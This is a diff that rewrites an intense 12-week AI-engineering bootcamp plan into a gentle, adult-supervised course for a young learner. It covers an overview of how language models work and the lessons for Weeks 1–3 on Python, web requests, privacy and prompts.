@@ -1,90 +1,95 @@
-# The 12-Week AI Engineer: Production-Ready Foundations & Shipped Portfolio
+# The Curious AI Builder: A Guided Course for a Brilliant Young Learner
 
-> **Target:** Build production-ready engineering foundations and ship four verified AI systems in 12 weeks (84 core build days + optional Days 85–90 Capstone Hardening & Hiring Sprint).  
-> **Method:** Apply the 80/20 rule to physical reality: master the ~20% of software plumbing, vector geometry, bounded state machines, and telemetry that drive ~80% of real-world enterprise value, and build every single day.
+> **Who this is for:** A curious young person who wants to understand AI by making things. No previous software-engineering job or AI experience is assumed. Some setup, accounts, online services, and spending require a trusted adult.
+> **The goal:** Build things you care about, learn the real ideas underneath them, and get good at checking whether they work. This is a learning journey, not a race, a hiring boot camp, or a promise of professional mastery in 90 days.
+
+## How to use this course
+
+- Follow the guided path, but take as long as you need. A course day is a learning unit, not a demand to finish in one sitting. Short sessions with breaks are fine; repeat a day whenever an idea is still fuzzy.
+- Start with the foundations week unless you already know the material. A short diagnostic helps you choose; skipping is allowed and never a test of intelligence.
+- Pick a project theme you genuinely like: a creature or space field guide, a mystery-solving helper, a story-world librarian, a sports-stats explorer, or a study helper. Use public, fictional, or adult-approved material. You can change themes later.
+- Each lesson should follow this rhythm: **big question → plain explanation → worked example → build together → playful experiment → explain what you noticed → optional challenge**. New technical words should be explained before they are used as if familiar.
+- The main path is local and private wherever possible. Ask a trusted adult before creating accounts, using paid APIs, sharing data, publishing a project, downloading software, or contacting anyone online. Never put a real name, school, address, password, API key, photo, or private family information into a project or public post.
+- A grown-up can help with setup and safety without taking over the learner's choices. Celebrate a good question, a surprising result, and a thoughtful decision to simplify—not just finished features.
+
+The 30-day plan is a separate, optional professional sprint for experienced adult developers. It is not the recommended route through this course. Days 71–77 and the reference material are optional curiosities; you can skip them without missing the main learning goals.
 
 ---
 
-## 0. The 80/20 Reframe: What Foundation Models Physically Are
+## 0. A first picture of how language models work
 
-**An AI engineer does not invent new neural architectures. An AI engineer builds deterministic, observable, and hardened systems on top of probabilistic foundation models they did not train.**
+**An AI builder makes useful things with models other people have trained—and learns to test what those models say and do.**
 
-To build with these systems, you must strip away the mystical marketing fluff. A Large Language Model is not a sentient brain, a conscious oracle, or a thinking person. 
+An AI model is not a person or an oracle. It is a computer program that learned patterns from examples. It can produce helpful answers, but it can also make things up. We will investigate how, rather than ask you to take anyone's word for it.
 
-### The Physical Mechanism Under the Hood
+### A first picture of what a language model does
 
-1. **Frozen Floating-Point Matrices:** Physically, a model is a multi-gigabyte array of frozen decimal numbers (weights) sitting in high-bandwidth GPU memory (HBM). It does not learn while you talk to it. Its parameters are locked in silicon.
-2. **The Tokenizer Chopping Block:** Computers cannot read words. A Byte-Pair Encoding (BPE) tokenizer chops raw UTF-8 text into integer IDs (e.g., "apple" → `17024`). The model never sees letters or grammar—it sees an ordered stream of integers.
-3. **The 100,000-Sided Dice Roller:** The GPU passes those token IDs through matrix multiplications to compute raw energy scores (logits) across a 100,000-word vocabulary. A softmax function converts those logits into probabilities. The model rolls a 100,000-sided die to pick the next single token ID, spits it onto the wire, appends it to the prompt, and repeats.
-4. **The Context Conveyor Belt:** The context window is not an infinite memory. It is a rigid conveyor belt with a hard byte limit (e.g., 128k tokens). Every token entering the conveyor belt costs exact money ($0.00015 per 1,000 input tokens). When the belt runs out of room, early tokens fall into the void.
-5. **The Open-Book Exam (RAG):** Because the model’s internal weights only know the past, you cannot expect it to know your private corporate data. Retrieval-Augmented Generation (RAG) is an open-book exam: an interrogation system retrieves the top 5 relevant index cards from disk, drops them onto the model's desk right inside the prompt, and forces it to cite its sources.
+1. **A learned recipe:** A trained model contains a huge collection of numbers that capture patterns from its training. When you ask a question, the numbers do not update; the model uses what it learned to make a response.
+2. **Text becomes numbered pieces:** Before the model handles text, a tokenizer divides it into small pieces called *tokens*. A piece might be a whole common word or just part of a rarer word. We will inspect examples rather than pretend every word becomes one piece.
+3. **One piece at a time:** The model estimates which next token would fit, chooses one, and repeats. This is why the result can sound convincing without being guaranteed true. The technical details—probabilities, logits, and sampling—come later, after the basic experiment makes sense.
+4. **A limited reading space:** A model can only handle a certain amount of text in one go. That limit is called its *context window*. Some services charge for the text they process; an adult should help manage any paid account.
+5. **A helper with a book:** If a model needs facts from a set of notes, our program can search those notes and show useful passages alongside the question. This is retrieval-augmented generation, or RAG. The model still needs to use the passages carefully, and we will test whether it did.
 
-Because an LLM is a probabilistic next-token dice roller, it fails silently, hallucinates with utter conviction, and treats instructions inside untrusted documents as direct orders from its creator. 
+The useful habit is simple: ask what evidence supports an answer, try examples that might break it, and never mistake confidence for proof.
 
-Your job as an **AI Systems Architect** is to build the iron cage around this probabilistic beast: rigid Pydantic casting stencils, millisecond vector radars, bounded state machines, and cryptographic fences.
+Your job as a learner is to make small systems that are helpful, understandable, and safe—and to improve them when experiments reveal a problem.
 
-### The 80/20 Filter Across the 3 Months
+### The journey: from first experiments to a thoughtful project
 
-| Phase | What you focus on (The 20% that builds real systems) | What you deliberately skip (The 80% distraction) |
+| Phase | What you will explore | Optional deep dives for later |
 |---|---|---|
-| **Month 1: 0 → Junior**<br>*(Foundations & Model Fluency)* | Terminal plumbing, Python types as casting molds, async event loops, HTTP wire packets, raw provider SDKs, Pydantic constrained decoding, BPE token arithmetic, and SSE ticker-tape streaming. | Linear algebra proofs, game dev, deep learning backprop calculus, framework sprawl (LangChain/CrewAI), and GPU kernel writing. |
-| **Month 2: Junior → Mid**<br>*(Context, RAG & Agents)* | 1,536-D vector geometry, PDF/AST parsing, dual-radar hybrid search (BM25 + Dense), RRF $k=60$ rank fusion, cross-encoder forensic rerankers, golden-set calipers (Recall@k, MRR, Faithfulness), Model Context Protocol (MCP), and bounded state machines. | Training custom embedding models from scratch, reading daily arXiv firehose, building custom vector engines in C++, and unbounded autonomous agent loops. |
-| **Month 3: Mid → Experienced**<br>*(Production, Scale & Open Models)* | Indirect prompt injection perimeter fences, tool AST sandboxes, Langfuse distributed telemetry, vLLM PagedAttention KV-cache serving, INT4/INT8 quantization arithmetic, LoRA adapter sleeves, and 2 AM outage playbooks. | Pretraining LLMs from scratch, multi-node GPU cluster hardware engineering, and distributed CUDA kernel development. |
+| **Weeks 1–4: Get curious** | Python and the terminal, asking a model questions, giving it a shape for its answers, and seeing how small programs can work together. | Memorizing jargon, rushing through setup, or paying for services without adult help. |
+| **Weeks 5–8: Give it useful things to read** | Turn a topic you chose into searchable notes, compare ways to find a useful passage, and check whether answers match their sources. | Production-sized databases, enterprise-scale performance tuning, and advanced ranking mathematics. |
+| **Weeks 9–12: Make it careful** | Let a model use a few safe tools, test tricky cases, improve your project, and explain what it can and cannot do. | Public deployment, real customer data, expensive hardware, and career-interview drills. |
+| **Optional challenge days** | Explore open models, model shrinking, reliability, and project presentation with adult guidance. | Treating advanced topics as required knowledge or a measure of talent. |
 
-### The Core Working Paradigm: Evaluation-Driven Development (EDD)
+### The key habit: test your ideas
 
-In classical software, deterministic code guarantees that `2 + 2 == 4`. In AI engineering, your core engine is a statistical dice roller whose output changes if temperature drifts or provider weights silently update. If you tune prompts or retrieval systems by "vibes" and subjective inspections, you are flying a jet through a blizzard with zero instruments.
+AI answers can change, so one successful example is not enough. Make a small set of questions, decide what a useful answer looks like, and try the same questions after each change. This is called evaluation. It is a way to learn from evidence, not a test you can fail.
 
-**The Senior Iron Law:** *Never touch a prompt template, re-index a vector database, or adjust search weights until your evaluation harness is written and your baseline numbers are locked into disk.*
+**A good experiment:** Change one thing, keep a note of what you expected, and compare the result with the old version. Use the short, plain-language missions as the core path; any technical API, cloud, or production detail is an optional adult/pro extension.
 
-- **The Contract:** Define exact Pydantic schemas, latency budgets (e.g., p95 < 2.0s), and hard cost ceilings ($0.002 per query).
-- **The Golden Set:** 40+ hand-curated, battle-verified evaluation fixtures with ground-truth chunk citations and canonical reference answers.
-- **The Caliper:** Run `python3 eval.py`. If Recall@5 or Faithfulness drops by even 1.5%, your pull request is dead on arrival.
+- **Choose a question:** What should your project help someone do?
+- **Make a few examples:** Write questions and note which source passage should help answer each one.
+- **Compare fairly:** Change one thing at a time and record whether answers became more useful, less useful, or simply different.
 
 ---
 
-## 1. The Three Months at a Glance: Unlocking Superpowers
+## 1. The course at a glance: from first experiments to a project of your own
 
 ```
-Month 1: The Machine Room, The Wire & The Dice Roller (Weeks 1–4)
-  ↳ Superpower: Command byte streams through Unix pipes, master the single-threaded async event loop,
-    strip model hallucinations with Pydantic JSON stencils, and stream real-time tokens via SSE under 400ms TTFT.
-Month 2: Spatial Memory, Dual Radars & Universal Tooling (Weeks 5–8)
-  ↳ Superpower: Project text into 1,536-D coordinate arrows, fuse dense semantic search with BM25 keyword radar via RRF,
-    measure retrieval with mathematical calipers (Recall@k, MRR), and wire private data into IDEs via MCP.
-Month 3: Armor, High-Throughput Silicon & Mission Control (Weeks 9–13)
-  ↳ Superpower: Neutralize indirect prompt injections with XML fences, trace every token and millisecond in Langfuse,
-    serve open models with vLLM PagedAttention, slip LoRA adapter sleeves onto frozen weights, author 2 AM outage runbooks, and launch a production portfolio showcase.
+Weeks 1–4: Get curious — learn enough Python to make small programs, ask a model questions, and test how instructions change its answers.
+Weeks 5–8: Find helpful clues — make a small collection of notes searchable and see whether good sources help the model answer carefully.
+Weeks 9–12: Make it careful — give the project a few safe tools, explore privacy and mistakes, and improve something you chose.
+Optional challenge days: explore advanced ideas if they interest you. They are invitations, not requirements.
 ```
 
 ---
 
-## 2. Ground Rules & The Hacker Spirit
+## 2. How to learn in this course
 
-1. **75% building, 25% reading.** Tutorials create the "Tutorial Illusion"—the false feeling of mastery while sitting passively. Only typing code, watching it crash, and diagnosing the physical failure builds scar tissue. Never read two days in a row without shipping a commit.
-2. **Every day ends with a Git commit.** A green GitHub contribution square is not vanity; it is cryptographic proof of physical progress against the machine.
-3. **The 45-minute timebox rule.** When a bug punches you in the mouth, set a timer for 45 minutes to diagnose the physical mechanism. If the clock hits 45:00 and you are still stuck, ship the simplest working workaround, log the technical debt in `LOG.md`, and advance. Never let a bug paralyze your momentum.
-4. **Three cumulative, production-grade systems.** No throwaway toy scripts. You build three evolving, production-grade systems across the 90 days. Each system is containerized, benchmarked, and defended with quantitative data.
-5. **Exact numbers over adjectives.** Amateurs say "our search is fast and accurate." Senior engineers say "our hybrid search achieves 92.4% Recall@5 at 108ms p95 latency for $0.0004 per query." If you cannot measure it with numbers, it does not exist.
-6. **Zero magic frameworks until you build the wire yourself.** No LangChain, no CrewAI, no black-box wrappers until you have built raw HTTP clients, manual retry loops, and deterministic state graphs by hand. You must understand the pain before adopting the abstraction.
-7. **Pacing and stamina:** 5 days of high-intensity building, 2 days of consolidation and active recovery per week (~2.5–4 hours/day). An exhausted engineer writes sloppy code and hallucinates progress. Protect your sleep and consolidation days.
-8. **10-Minute Daily Spaced Retrieval Drill (`make drill`).** Start every single session with a randomized active recall challenge from `scripts/log.py`. Forcing your brain to pull concepts from memory across 3, 7, and 14-day intervals physically restructures your neural pathways and locks skills into permanent muscle memory.
-9. **Friday Adversarial Bug Hunts (`make labs`).** Friday is demolition day. You do not understand a system until you know how to break it. Hunt down retry storms, inverted vector sorting, prompt injection leaks, and streaming memory fragmentation in real production labs.
+1. **Go at your own pace.** “Day” means one lesson, not one deadline. Take breaks, split a lesson across sessions, or repeat it.
+2. **Be curious before being correct.** Guess what will happen, try it, and compare. A surprising result is useful evidence.
+3. **Explain ideas in your own words.** Draw a picture, tell a story, or write a few sentences. It is fine if the first explanation is incomplete.
+4. **Keep an experiment notebook.** Note what you tried, what happened, and what you still wonder. A failed experiment is still a result.
+5. **Choose a theme you care about.** Use imaginary characters, public facts, or material a trusted adult has approved. You can change the theme at any time.
+6. **Make small versions first.** A tiny program you understand is a stronger start than a giant project copied from instructions.
+7. **Ask a trusted adult before accounts, downloads, online services, spending, or sharing.** Never put passwords, API keys, real names, school details, photos, addresses, or private family information into a project.
+8. **Use the memory games when they help.** They are optional practice, not a daily test or streak you must maintain.
+9. **Celebrate the questions and discoveries.** Finishing is nice; noticing a problem, asking why, and deciding what to try next are part of the work too.
 
 ---
 
-## 3. Pick Your Stack Once, Then Stop Shopping
+## 3. Choose a safe starting setup with a trusted adult
 
 | Layer | Standard Choice | Why |
 |---|---|---|
-| **Language** | Python 3.11+, managed with `uv` | Fastest package resolution, modern typing, universal AI ecosystem support. |
-| **Model Providers** | Primary: OpenAI or Anthropic · Secondary: Google Gemini | Teaches provider portability, streaming differences, and cost routing. |
-| **API & Service** | FastAPI + Uvicorn | Native async, high throughput, automatic OpenAPI documentation, easy SSE streaming. |
-| **Safety & Budget** | `starters/common/budget_guard.py` | Enforces hard session spend caps ($2 default) and disk response caching for evals. |
-| **Vector Database** | pgvector or Qdrant | SQL compatibility or pure vector performance. Avoids vendor lock-in. |
-| **Tracing & Observability** | Langfuse (self-hosted or cloud) | Complete trace visibility, token cost attribution, latency waterfalls, and user feedback. |
-| **Agent / Workflow** | Pydantic AI or LangGraph | Deterministic state graphs over unpredictable free-floating agent loops. |
-| **Deployment** | Render, Fly.io, or Railway | Zero-devops deployment with Docker support in under 15 minutes. |
+| **First language** | Python and a local editor | Start with examples the learner can run and change. Ask an adult before installing tools. |
+| **Model** | Offline examples first; an adult-approved service if needed | Do not create accounts, enter API keys, or spend money without a trusted adult. |
+| **Project data** | Fictional notes, public facts, or adult-approved material | Never use private family, school, account, or identifying information. |
+| **Search** | A short Python list, then a local index if useful | Learn what search is doing before choosing a database. |
+| **Safety** | Small permissions, fake examples, and human checks | A prompt or label alone cannot guarantee that a model is safe. |
+| **Sharing** | Private demonstration first | Public publishing is optional and needs adult agreement and review. |
 
 ---
 
@@ -93,723 +98,724 @@ Month 3: Armor, High-Throughput Silicon & Mission Control (Weeks 9–13)
 <!-- Generated from site/course-data.js by scripts/build_plan.py — do not edit
      this region by hand. Edit the data file and run `make plan`. -->
 
-## Week 1 — Developer Foundations (The Machine Room & The Wire)
+## Week 1 — Start Here: Python, Projects & Asking Good Questions
 *Days 1–7*
 
-**Outcome: "I can command the terminal, wield typed Python as a compiler mold, isolate dependencies with uv in milliseconds, and manage Git trees without fear."**
+**Outcome: "I can run a small Python project, make a change safely, and explain what I learned in my own words."**
 
-### Day 1 — The terminal machine room: pipes, streams, and PATH mechanics
-- [ ] Trace the physical life of a shell command: how the OS searches executable binary paths in `$PATH` before raising "command not found"
-- [ ] Plumb raw byte streams using Unix pipes `|` and redirection `>` to route stdout into stdin without touching disk
-- [ ] Inspect megabyte log dumps with `cat`, `grep`, `head`, and `tail -f` to isolate error patterns in milliseconds
-- [ ] **Build:** an adversarial shell drill — construct a nested directory tree, locate corrupt log lines with regex grep, and fix a broken binary PATH
-- [ ] **Done when:** You diagnose and repair a broken environment path or missing binary in under 60 seconds without panic.
+### Day 1 — Meet the terminal: giving your computer tiny instructions
+- [ ] With a trusted adult, open the coding workspace and find where your project files live
+- [ ] Run a tiny Python instruction and change one word or number to see what changes
+- [ ] Learn what a folder, file, and error message are by exploring a pretend project
+- [ ] **Build:** a tiny program that introduces your made-up character, creature, or robot
+- [ ] **Done when:** You can run your program, change it, and explain what one line does.
 
-### Day 2 — Pragmatic Python: type hints as rigid casting molds
-- [ ] Functions, modules, and memory references: why Python objects are heap pointers and how list comprehensions avoid loop overhead
-- [ ] Type hints (`int`, `str`, `dict[str, Any]`, `Optional[T]`) as rigid stencils that catch malformed model payloads before runtime
-- [ ] Enforce data integrity with `dataclasses` and Pydantic models: casting raw incoming byte strings into typed memory structures
-- [ ] **Build:** a typed text analysis module that parses command-line arguments, counts token frequencies, and passes strict mypy checks
-- [ ] **Done when:** Your module runs with zero mypy/pyright type errors and rejects malformed dictionary shapes on startup.
+### Day 2 — Python recipes: names, values, and simple functions
+- [ ] Store a name, number, or sentence in a variable and print it back
+- [ ] Use an if/else choice to make your program react to different answers
+- [ ] Turn repeated instructions into a function with a name you choose
+- [ ] **Build:** a short quiz about a topic you like, with at least two possible responses
+- [ ] **Done when:** Your quiz runs twice with different answers, and you can point out its choice and function.
 
-### Day 3 — Airtight environments: sub-second dependency isolation with uv
-- [ ] Virtual environments demystified: how `sys.prefix` isolates packages and why global pip installs poison machine state
-- [ ] Wield `uv` for lightning package resolution: 10–100x faster than pip via Rust-powered wheel caching and hardlink sharing
-- [ ] Lock project dependencies deterministically with `pyproject.toml` and `uv.lock` to guarantee reproducible builds on any machine
-- [ ] **Build:** initialize an isolated uv workspace configured with automated formatting and linting via `ruff`
-- [ ] **Done when:** You can destroy your virtual environment and rebuild it completely from `uv.lock` in under 5 seconds.
+### Day 3 — Make a small collection and explore it with a loop
+- [ ] Put a few made-up facts, creatures, or objects into a Python list
+- [ ] Use a loop to show each item without copying the same instruction many times
+- [ ] Count the items and find one that matches a simple rule
+- [ ] **Build:** a tiny explorer that displays and counts entries in your collection
+- [ ] **Done when:** You can add an item and explain how the loop visits each entry.
 
-### Day 4 — Git under the hood: Merkle trees, commits, and merge mechanics
-- [ ] Git's physical anatomy: commits as immutable SHA-1 content snapshots, trees as directory listings, and branches as movable pointers
-- [ ] Commit hygiene: atomic changes, descriptive imperative messages, and feature branch workflows
-- [ ] Manufacture a deliberate merge conflict by editing identical lines on two branches, then resolve it cleanly by inspecting raw diff markers
-- [ ] **Build:** initialize a clean GitHub repository, commit on an isolated feature branch, push upstream, and merge via pull request
-- [ ] **Done when:** The words "merge conflict" produce calm analysis instead of an elevated heart rate.
+### Day 4 — Save versions: how to undo a change safely
+- [ ] Make a copy of a tiny project before changing it; compare the old and new versions
+- [ ] Use the editor's undo and save features, and talk through what each one does
+- [ ] Ask an adult to show how a version history remembers earlier snapshots
+- [ ] **Build:** make one planned change, save a named version, then return to the earlier version with adult help
+- [ ] **Done when:** You can find an earlier saved version and describe why keeping copies helps.
 
-### Day 5 — Testing calipers: unit tests, edge cases, and pytest harnesses
-- [ ] The testing mindset: writing tripwire assertions that scream the microsecond a refactor breaks system behavior
-- [ ] `pytest` mechanics: test discovery rules, assertion rewriting, and reusable setup fixtures
-- [ ] Parametrized testing across nasty edge boundaries: empty strings, null bytes, unicode emojis, and $2^{31}-1$ integers
-- [ ] **Build:** author a comprehensive test suite for your Day 2 text analysis module achieving 100% pass rate on edge cases
-- [ ] **Done when:** Running `pytest` catches an intentionally injected off-by-one bug and reports the exact failing line.
+### Day 5 — Be a program detective: try examples that might break it
+- [ ] Write down what you expect your quiz or explorer to do before you run it
+- [ ] Try an ordinary answer, an empty answer, and a surprising answer
+- [ ] When something goes wrong, read the error slowly and change one thing at a time
+- [ ] **Build:** a short list of three tests another person can try on your program
+- [ ] **Done when:** You found one surprising result, fixed it or explained it, and saved your three tests.
 
-### Day 6 — Building robust typed CLI tools for terminal automation
-- [ ] Parse CLI flags, positional arguments, and subcommands using `argparse` with automated `--help` manual generation
-- [ ] Format terminal output: streaming progress indicators, ASCII status tables, and standard POSIX exit codes (0 for success, 1+ for errors)
-- [ ] Defensive I/O: gracefully handle missing file paths, read permission denials, and broken pipe signals (`SIGPIPE`)
-- [ ] **Build:** a production CLI tool that analyzes codebase directories, reports lines of code, and outputs structured JSON or text tables
-- [ ] **Done when:** A peer can invoke your CLI via `uv run` with `--help` and receive clear flags, clean output, and proper exit codes.
+### Day 6 — Turn your small program into a mini-game
+- [ ] Give your program a goal, such as guessing a number or choosing a creature
+- [ ] Add a score, clue, or second round using ideas from earlier days
+- [ ] Ask someone to try it and notice where they hesitate
+- [ ] **Build:** a playable little game or interactive story in Python
+- [ ] **Done when:** Someone else can play your game and tell you what they think its goal is.
 
-### Day 7 — Foundation checkpoint: automated CI assembly line and ship
-- [ ] Package your CLI into a standalone repo with a crisp README explaining installation, usage flags, and benchmarks
-- [ ] Wire an automated GitHub Actions CI pipeline that executes `ruff check` and `pytest` on every push
-- [ ] Enforce zero-regression gates: block pull request merges if any unit test fails or code formatting drifts
-- [ ] Rest and consolidate: protect your momentum; the marathon requires deliberate pacing
-- [ ] **Done when:** Your repository displays a live green CI build badge verifying tests pass cleanly on an automated cloud runner.
+### Day 7 — Checkpoint: show your first Python creation
+- [ ] Choose one favorite part of your game and make it easier to understand
+- [ ] Draw the steps your program follows from start to finish
+- [ ] Show it privately to someone you trust, or simply save it for yourself
+- [ ] Rest and choose one question you want to explore next
+- [ ] **Done when:** You can show or describe your creation and name one thing you learned.
 
 ---
 
-## Week 2 — Asynchronous Python & Web Protocols (The Wire & The Conductor)
+## Week 2 — How Programs Talk: Web Requests, Waiting & Helpful Errors
 *Days 8–14*
 
-**Outcome: "I understand raw HTTP bytes, command the async event loop like a master conductor, and build resilient API gateways that never stall under load."**
+**Outcome: "I can send a program a request, understand its reply, and make my project handle common problems safely."**
 
-### Day 8 — HTTP wire anatomy: verbs, headers, status codes, and JSON payloads
-- [ ] The physical wire: how ASCII text headers and raw byte bodies travel over TCP sockets on port 80/443
-- [ ] Dissect HTTP methods (GET, POST), headers (`Content-Type`, `Authorization`), and status codes (200, 400, 401, 429, 500, 503)
-- [ ] Inspect network packet exchanges using `curl -v` to watch the TLS handshake, headers, and payload transfer in real time
-- [ ] **Build:** construct a raw HTTP client using Python's standard `urllib.request` that parses response headers and extracts JSON bytes
-- [ ] **Done when:** You can point to raw network bytes and identify where headers end, where the body begins, and what status code returned.
+### Day 8 — How websites talk: send a question, get a reply
+- [ ] Use a picture or pretend example to see a browser ask a website for information
+- [ ] Learn that a request is a question and a response is the reply; status numbers are clues about what happened
+- [ ] Try a safe, public example with an adult, or act out the request and response with paper cards
+- [ ] **Build:** a small Python program that shows a pretend request, response, and status clue
+- [ ] **Done when:** You can explain the question/reply idea and name one clue that a request did not work.
 
-### Day 9 — Secret hygiene: API keys, bearer tokens, and the vault
-- [ ] Authentication on the wire: API keys vs OAuth Bearer tokens, and why credentials must live in headers, never URL query strings
-- [ ] Ironclad environment hygiene: `.env` files, shell exports, and `.gitignore` rules to prevent credential leaks
-- [ ] Zero-downtime key rotation: how production services accept dual keys during migration windows without dropping requests
-- [ ] **Build:** a configuration loader using Pydantic Settings that validates required API keys on startup and fails fast with actionable errors
-- [ ] **Done when:** Your application refuses to boot if an API key is missing and guarantees zero credentials can ever be committed to Git.
+### Day 9 — Keep secrets secret: passwords and private information
+- [ ] Spot private information in examples and replace it with clearly made-up details
+- [ ] Learn that a password or API key is like a key to a locked room—never paste one into a lesson or chat
+- [ ] Ask a trusted adult before using an online service, making an account, or installing a tool
+- [ ] **Build:** a pretend secret-spotting game that marks fake passwords in sample text
+- [ ] **Done when:** You can identify three kinds of private information and explain who to ask before sharing anything.
 
-### Day 10 — The asynchronous conductor: asyncio and the single-threaded event loop
-- [ ] Synchronous blocking vs asynchronous non-blocking: why waiting on network I/O starves single threads
-- [ ] The event loop under the hood: how `async` and `await` yield control back to the conductor while sockets wait for bytes
-- [ ] Concurrent request blasting: firing 20 network requests simultaneously using `asyncio.gather()` with strict timeout bounds
-- [ ] **Build:** an async web fetcher that downloads 20 endpoints concurrently in 1.8 seconds instead of 25 seconds synchronously
-- [ ] **Done when:** You can physically explain why async handles 1,000 idle network sockets on a single CPU core without thread context switching.
+### Day 10 — Waiting without getting stuck: what programs do while they wait
+- [ ] Compare a program that waits doing nothing with one that can do a second small task
+- [ ] Use a kitchen timer or pretend message delivery to model waiting for a reply
+- [ ] Learn that some Python tools can wait politely instead of freezing everything
+- [ ] **Build:** a tiny two-task demonstration that prints what it does while waiting
+- [ ] **Done when:** You can explain the difference between waiting and doing a useful second task.
 
-### Day 11 — API construction: high-throughput services with FastAPI
-- [ ] FastAPI architecture: Starlette async core, route handlers, path parameters, and query parameters
-- [ ] Input contracts: validating request bodies against strict Pydantic schemas with automatic 422 Unprocessable Entity responses
-- [ ] Interactive API documentation: inspecting and testing routes via automatic OpenAPI Swagger UI at `/docs`
-- [ ] **Build:** a typed REST API service with health probes (`/healthz`), custom error handlers, and structured JSON output
-- [ ] **Done when:** Sending a malformed JSON payload to your endpoint returns an immediate 422 error detailing the exact invalid field.
+### Day 11 — Give your project a simple doorway
+- [ ] Learn what a doorway (an interface) lets another part of a program ask your project
+- [ ] Sketch the input your project needs and the kind of answer it should return
+- [ ] Try a local example; any online setup or account needs adult help and approval
+- [ ] **Build:** a simple function that accepts a pretend question and returns a clear answer
+- [ ] **Done when:** You can show what goes in and what comes out of your function.
 
-### Day 12 — The resilient client: connection pools and timeouts with HTTPX
-- [ ] Modern async HTTP networking: persistent TCP connection pools and HTTP/2 multiplexing with `httpx.AsyncClient`
-- [ ] Timeout budgets: configuring separate granular limits for DNS resolution, TCP connect (2s), and read response (5s)
-- [ ] Mocking the wire: intercepting external HTTP calls in unit tests with `respx` to test failure paths without internet access
-- [ ] **Build:** an async client wrapper that concurrently polls three remote APIs with connection pooling and strict timeouts
-- [ ] **Done when:** Your client reuses active TCP sockets across requests and aborts immediately when an upstream endpoint exceeds its timeout budget.
+### Day 12 — What if the reply is late or missing?
+- [ ] Imagine asking a question and not getting an answer right away; decide what your program should do
+- [ ] Try a pretend slow reply and a pretend missing reply without contacting a real service
+- [ ] Add a friendly message and a safe way to try again
+- [ ] **Build:** a small example that handles a successful answer and a missing answer differently
+- [ ] **Done when:** Your program stays understandable when a reply is late or missing.
 
-### Day 13 — Battle-hardened resilience: exponential backoff, jitter, and circuit breakers
-- [ ] Upstream failure modes: distinguishing transient hiccups (429 Rate Limit, 503 Overloaded) from fatal errors (400, 401, 404)
-- [ ] Thundering herds: why naive fixed retries crash recovering servers, and how exponential backoff with full jitter ($t = \text{rand}(0, 2^n)$) diffuses traffic
-- [ ] Circuit breaker pattern: tripping the circuit to reject downstream calls immediately when an external provider goes dark
-- [ ] **Build:** an async retry decorator using `tenacity` configured with exponential backoff, randomized jitter, and retry quotas
-- [ ] **Done when:** Your client recovers cleanly from simulated 429 rate limit spikes without dropping tasks or hammering the upstream provider.
+### Day 13 — Retry kindly: don’t ask again and again too fast
+- [ ] Model what happens when many people knock on the same door at once
+- [ ] Compare trying every second with waiting a little longer between tries
+- [ ] Set a small retry limit so your program can stop and explain what happened
+- [ ] **Build:** a pretend helper that waits between tries and then gives a friendly stop message
+- [ ] **Done when:** You can explain why waiting between tries is kinder and why a retry limit matters.
 
-### Day 14 — Ship: Resilient Asynchronous API Gateway
-- [ ] Combine FastAPI, `httpx.AsyncClient`, connection pools, and jittered retries into an asynchronous API gateway
-- [ ] Deploy the service live to Render, Fly.io, or Railway with an automated `/healthz` probe
-- [ ] Write an automated pytest suite testing successful responses, 429 backoff recovery, and timeout error wrapping
-- [ ] **Done when:** A peer can curl your live deployed gateway URL and receive a structured JSON response in under 200ms.
+### Day 14 — Checkpoint: make your program handle a missing reply
+- [ ] Put together your pretend request, reply, and friendly error message
+- [ ] Try one example that works and one where no answer arrives
+- [ ] Ask a trusted adult to review any optional account or online setup
+- [ ] **Done when:** Your practice program can send a pretend request, read the reply, and explain one kind of error it might receive.
 
 ---
 
-## Week 3 — Model API Fluency & Prompt Engineering (The Dice Roller & The Cash Register)
+## Week 3 — Talking to AI: Patterns, Prompts & Text Pieces
 *Days 15–21*
 
-**Outcome: "I understand token economics to the fourth decimal place, manipulate the 100k-sided dice roller with precision, and cache prompt prefixes to cut costs by 80%."**
+**Outcome: "I can try different instructions, notice how an AI answer changes, and understand that models use numbered pieces of text."**
 
-### Day 15 — Under the hood: logits, sampling parameters, and raw model calls
-- [ ] What an LLM physically does: computing probability distributions (logits) over a 100,000-token vocabulary and rolling dice
-- [ ] Sampling controls: temperature (shaking the dice), top_p (nucleus sampling), `max_tokens` (the guillotine), and stop sequences
-- [ ] Raw SDK calls (OpenAI / Anthropic): system prompts as foundational rules, user queries, and assistant completions
-- [ ] **Build:** a CLI runner that executes model completions, measures roundtrip latency, and computes token cost to $0.0001 precision
-- [ ] **Done when:** You can state the exact physical mechanism of temperature=0.0 (greedy argmax) vs temperature=0.8 and calculate cost per run to the cent.
+### Day 15 — Meet a language model: a pattern guesser, not an oracle
+- [ ] Learn that a language model guesses likely next pieces of text from patterns it learned
+- [ ] Ask two made-up questions and compare the answers
+- [ ] Notice that a confident answer can still be wrong or change when the wording changes
+- [ ] **Build:** a small experiment card with your question, what you expected, and what happened
+- [ ] **Done when:** You can explain that a model guesses likely next pieces of text and may give different answers to the same question.
 
-### Day 16 — BPE token mechanics, spelling blind spots, and BudgetGuard
-- [ ] Byte-Pair Encoding (BPE) mechanics: how raw UTF-8 text is recursively merged into integer token IDs
-- [ ] Tokenizer blind spots: why models fail at counting letters in "strawberry" or reversing strings (they see token chunks, not characters)
-- [ ] Enforce financial safety: integrate `BudgetGuard` to track cumulative session spend and trip an emergency breaker at $2.00
-- [ ] **Build:** an adversarial script testing tokenization boundaries (spaces, punctuation, code indentation) and verifying spend limits
-- [ ] **Done when:** Your script halts instantly with an assertion error the moment cumulative API spend hits your configured $2 budget ceiling.
+### Day 16 — Why a model sometimes misses letters and tiny details
+- [ ] Explore how text is divided into pieces called tokens; a piece can be a whole word or part of one
+- [ ] Try asking a model to count letters in "strawberry" and check its answer yourself
+- [ ] Compare a word as one piece, several pieces, or separate letters
+- [ ] **Build:** a little example showing why a computer program can count letters more reliably
+- [ ] **Done when:** You can explain that tokens are pieces of text and that any online account or spending needs adult approval.
 
-### Day 17 — Prompt engineering under fire: few-shot stencils and reasoning traces
-- [ ] Few-shot prompting: conditioning the model's token distribution by providing 3–5 input-output pairs inside the prompt stencil
-- [ ] Chain-of-thought (CoT) mechanics: why forcing the model to emit intermediate scratchpad tokens on the wire improves reasoning accuracy
-- [ ] Version control for prompts: separating prompt templates into versioned files (`.jinja` / `.py`) instead of messy inline f-strings
-- [ ] **Build:** a versioned prompt evaluation module tested against a 20-sample benchmark to track accuracy shifts
-- [ ] **Done when:** Modifying a prompt template automatically runs against your 20-sample benchmark and outputs an exact pass/fail delta.
